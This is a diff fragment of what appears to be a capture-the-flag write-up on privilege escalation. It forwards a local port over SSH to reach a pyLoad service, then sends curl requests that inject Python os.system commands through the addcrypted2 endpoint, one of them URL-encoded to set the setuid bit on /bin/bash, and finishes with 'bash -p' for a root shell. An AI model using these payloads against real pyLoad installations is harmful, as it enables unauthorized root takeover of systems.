@@ -40,9 +40,9 @@ Indeed they do as I ssh'd in as sau. There was user.txt in /home/sau.
 Uploaded 'lse.sh' from my pc to target machine to help enumerating.
 There were 'Services listening only on localhost' so I used 'netstat -ant' to find out what they are.
 
-
-
-
+127.0.0.1:8000 
+ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
+pyLoad
 
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
@@ -51,3 +51,10 @@ curl -i -s -k -X $'POST' \
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:8000/flash/addcrypted2'
+
+bash -p
+
+
+
+
+
